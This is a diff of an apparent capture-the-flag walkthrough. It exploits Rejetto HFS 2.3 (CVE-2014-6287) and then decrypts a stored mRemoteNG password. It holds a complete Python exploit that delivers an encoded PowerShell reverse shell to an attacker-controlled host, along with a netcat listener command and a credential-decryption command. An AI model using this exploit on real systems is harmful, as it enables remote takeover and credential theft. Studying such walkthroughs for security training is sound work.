@@ -15,73 +15,99 @@ searchsploit HttpFileServer 2.3
 
 ## edit script
 
+```
 https://github.com/thepedroalves/HFS-2.3-RCE-Exploit/blob/main/exploit.py
+```
 
 ```
-# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
-# Google Dork: intext:"httpfileserver 2.3"
-# Date: 20/02/2021
-# Exploit Author: Pergyz
-# Vendor Homepage: http://www.rejetto.com/hfs/
-# Software Link: https://sourceforge.net/projects/hfs/
-# Version: 2.3.x
-# Tested on: Microsoft Windows Server 2012 R2 Standard
-# CVE : CVE-2014-6287
-# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
-
 #!/usr/bin/python3
+#
+# Rejetto HFS 2.3.x RCE Vulnerability Exploit
+# CVE-2014-6287
+#
+# Using Nikhil Mittal Powershell Reverse Shell One Liner
+#
+#
 
+import requests
+import urllib
 import base64
-import os
-import urllib.request
-import urllib.parse
 
-lhost = "10.10.16.218"
-lport = 1337
-rhost = "10.10.10.8"
-rport = 80
+lhost = 'FRANKISHTIEN-64015.portmap.host' # Change this
+lport = '64015'        # Change this
+rhost = '54.176.68.184' # Change this
+rport = '1337'        # Change this
 
-# Define the command to be written to a file
-command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'
+command = '$client = New-Object System.Net.Sockets.TCPClient("' + lhost + '",' + lport + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
-# Encode the command in base64 format
-encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
+command_bytes = command.encode('utf-16le')
+base64_bytes = base64.b64encode(command_bytes)
+encodedcommand = base64_bytes.decode('ascii')
 
-# Define the payload to be included in the URL
-payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
+payload = 'exec|powershell.exe -ep bypass -encodedcommand ' + encodedcommand 
 
-# Encode the payload and send a HTTP GET request
-encoded_payload = urllib.parse.quote_plus(payload)
-url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
-urllib.request.urlopen(url)
-print("[+] Encoded the payload and sent a HTTP GET request to the target")
+encodedpayload = urllib.parse.quote_plus(payload)
 
-# Print some information
-print("lhost: ", lhost)
-print("lport: ", lport)
-print("rhost: ", rhost)
-print("rport: ", rport)
-print("payload: ", payload)
+url = 'http://' + rhost + ':' + rport + '/?search=%00{.' + encodedpayload + '.}'
 
-# Listen for connections
-os.system(f'nc -nlvp {lport}')
+r = requests.get(url)
+
+if r.status_code == 200:
+    print('GET Request Sent')
+else:
+    print('Failed to Send Request')
 ```
 
 
 
-
----
----
+<img width="1503" height="834" alt="image" src="https://github.com/user-attachments/assets/408d8ba4-2a41-4f67-ae95-557511550249" />
 
 
-<img width="410" height="300" alt="image" src="https://github.com/user-attachments/assets/29f9ef4d-a66e-4bd4-8283-f491e5c1c71f" />
+<img width="1169" height="786" alt="image" src="https://github.com/user-attachments/assets/53dfbd61-db63-4663-af5d-7d305ccbecdf" />
+
+```
+sudo openvpn --config FRANKISHTIEN.first.ovpn
+```
+
+
+<img width="1033" height="385" alt="image" src="https://github.com/user-attachments/assets/0a994f9c-1ded-4aa1-91a6-331a1c0708db" />
 
 
 ```
-
+python3 exploit.py
+nc -lnvp 9999
 ```
 
+<img width="757" height="151" alt="image" src="https://github.com/user-attachments/assets/256c0bdc-90d0-4035-833e-f6d1dfd98eef" />
+
+
+
+<img width="973" height="352" alt="image" src="https://github.com/user-attachments/assets/ef9c27aa-097c-43ed-a51b-6ec727d06922" />
+
+
+<img width="909" height="535" alt="image" src="https://github.com/user-attachments/assets/d8701862-17c3-42d3-a1d9-72541e316bd8" />
+
+> ## after some search found this explotaion to mremoteng
+
+```
 https://vk9-sec.com/exploiting-mremoteng/
+```
+
+<img width="1158" height="609" alt="image" src="https://github.com/user-attachments/assets/1c81e425-8cc6-44f3-9d14-de84a5f40d46" />
+
+```
+Password="UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw=="
+```
+
+
+```
+python3 mremoteng_decrypt.py -s UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw==
+```
+
+<img width="1167" height="167" alt="image" src="https://github.com/user-attachments/assets/9fe73392-c99a-46e6-a269-d66824d9ccc6" />
+
+
+
 
 
 ## **`password`**
